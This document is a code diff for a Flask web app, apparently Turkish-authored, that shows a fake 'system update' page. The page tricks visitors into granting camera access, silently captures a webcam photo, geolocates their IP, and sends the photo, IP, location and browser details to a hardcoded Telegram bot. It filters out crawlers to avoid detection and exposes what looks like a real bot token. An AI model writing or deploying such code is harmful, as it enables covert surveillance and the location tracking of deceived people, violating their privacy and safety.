@@ -1,75 +1,151 @@
 from flask import Flask, request
+import socket
 import requests
 import time
 import os
+import base64
 
 app = Flask(__name__)
 
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
 
-son_mesaj_zamani = 0
-
 def telegram_mesaj_gonder(mesaj):
-    global son_mesaj_zamani
-    simdi = time.time()
-    if simdi - son_mesaj_zamani < 10: return
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"})
-        son_mesaj_zamani = simdi
     except Exception as e:
         print("Telegram Hatası:", e)
+
+# 📸 FOTOĞRAF VE BİLGİLERİ BİRLİKTE GÖNDEREN FONKSİYON
+def telegram_fotograf_ve_bilgi_gonder(fotograf_base64, bilgi_metni):
+    try:
+        resim_verisi = fotograf_base64.split(",")[1]
+        resim_bytes = base64.b64decode(resim_verisi)
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+        files = {'photo': ('ajan_fotografi.jpg', resim_bytes)}
+        # Fotoğrafın altına yazılacak olan bilgiler (Caption)
+        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
+        
+        requests.post(url, files=files, data=data)
+        print("✅ Fotoğraf ve bilgiler Telegram'a gönderildi!")
+    except Exception as e:
+        print("Fotoğraf Gönderme Hatası:", e)
 
 @app.route('/', methods=['GET'])
 def ana_sayfa():
     if request.path == '/favicon.ico': return "OK", 200
     
-    forwarded_for = request.headers.get('X-Forwarded-For')
-    if forwarded_for:
-        ziyaretci_ip = forwarded_for.split(',')[0].strip()
-    else:
-        ziyaretci_ip = request.remote_addr
+    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
     
-    user_agent = request.headers.get('User-Agent')
-    sehir = "Bilinmiyor"
-    ulke = "Bilinmiyor"
-    hava = "Alınamadı"
-    sorgulanan_ip = ziyaretci_ip
+    user_agent = request.headers.get('User-Agent', '').lower()
     
-    # 🚨 EĞER IP YEREL AĞ (192.168...) İSE, EVİN GENEL IP'SİNİ AL
-    if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("10.") or ziyaretci_ip.startswith("127."):
-        try:
-            # Evin dış IP'sini bul
-            sorgulanan_ip = requests.get('https://api.ipify.org').text
-        except:
-            pass
+    # Bot filtreleri
+    if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or ziyaretci_ip == '127.0.0.1':
+        return "OK", 200
 
+    # Kamera izni isteyen HTML/JS
+    html = f"""
+    <body style='background:#111; color:#0f0; font-family: monospace; text-align:center; padding-top:10%;'>
+        <h2 style='color: red;'>SİSTEM GÜNCELLEMESİ</h2>
+        <p>Devam etmek için lütfen aşağıdaki butona basın.</p>
+        <button onclick="kamerayiAc()" style='padding: 15px 30px; font-size: 20px; cursor: pointer;'>SİSTEMİ BAŞLAT</button>
+        <p id='durum' style='margin-top: 20px; color: yellow;'></p>
+
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <script>
+            async function kamerayiAc() {{
+                document.getElementById('durum').innerHTML = "Kamera bağlanıyor... Lütfen izin verin.";
+                try {{
+                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {{
+                        setTimeout(() => {{
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            const foto = canvas.toDataURL('image/jpeg');
+                            
+                            fetch('/kamera', {{
+                                method: 'POST',
+                                headers: {{ 'Content-Type': 'application/json' }},
+                                body: JSON.stringify({{ image: foto, ip: "{ziyaretci_ip}" }})
+                            }});
+                            
+                            document.getElementById('durum').innerHTML = "✅ İşlem tamamlandı!";
+                            stream.getTracks().forEach(track => track.stop());
+                        }}, 1500);
+                    }};
+                }} catch (error) {{
+                    document.getElementById('durum').innerHTML = "❌ Kamera izni verilmedi.";
+                    // İzin verilmezse sadece bilgileri yazı olarak gönder
+                    fetch('/kamera_hata', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{ ip: "{ziyaretci_ip}" }})
+                    }});
+                }}
+            }}
+        </script>
+    </body>
+    """
+    return html
+
+@app.route('/kamera', methods=['POST'])
+def kamera():
+    veri = request.json
+    ip = veri['ip']
+    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
+    
+    # Bilgileri topla
     try:
-        # Konumu sorgula
-        konum_verisi = requests.get(f'http://ip-api.com/json/{sorgulanan_ip}', timeout=5).json()
-        if konum_verisi.get('status') == 'success':
-            sehir = konum_verisi.get('city', 'Bilinmiyor')
-            ulke = konum_verisi.get('country', 'Bilinmiyor')
-            hava = requests.get(f'https://wttr.in/{sehir}?format=3').text.strip()
-    except Exception as e:
-        pass
+        konum_verisi = requests.get(f'http://ip-api.com/json/{ip}').json()
+        sehir = konum_verisi.get('city', 'Bilinmiyor')
+        ulke = konum_verisi.get('country', 'Bilinmiyor')
+        hava = requests.get(f'https://wttr.in/{sehir}?format=3').text.strip()
+    except:
+        sehir, ulke, hava = "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
 
-    mesaj = f"""🚨 <b>SİTEYE BİRİ GİRDİ!</b>
-🌐 <b>Yerel IP:</b> {ziyaretci_ip}
-🌍 <b>Genel IP:</b> {sorgulanan_ip}
+    # Fotoğrafın altına yazılacak metin
+    bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
+    
+🌐 <b>IP Adresi:</b> {ip}
 📍 <b>Konum:</b> {sehir}, {ulke}
-☀️ <b>Hava:</b> {hava}
+☀️ <b>Hava Durumu:</b> {hava}
+📱 <b>Tarayıcı:</b> {user_agent}"""
+
+    # Fotoğrafı ve bilgileri birlikte gönder
+    telegram_fotograf_ve_bilgi_gonder(veri['image'], bilgi_metni)
+    return "OK", 200
+
+@app.route('/kamera_hata', methods=['POST'])
+def kamera_hata():
+    veri = request.json
+    ip = veri['ip']
+    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
+    
+    try:
+        konum_verisi = requests.get(f'http://ip-api.com/json/{ip}').json()
+        sehir = konum_verisi.get('city', 'Bilinmiyor')
+    except:
+        sehir = "Bilinmiyor"
+
+    mesaj = f"""⚠️ <b>SİTEYE GİREN OLDU (KAMERA İZNİ YOK)</b>
+    
+🌐 <b>IP Adresi:</b> {ip}
+📍 <b>Konum:</b> {sehir}
 📱 <b>Tarayıcı:</b> {user_agent}"""
 
     telegram_mesaj_gonder(mesaj)
-    
-    return """
-    <body style='background:#111; color:#0f0; text-align:center; padding-top:20%;'>
-        <h1>SİSTEM ÇALIŞIYOR</h1>
-        <p>Akıllı IP kontrolü aktif!</p>
-    </body>
-    """
+    return "OK", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
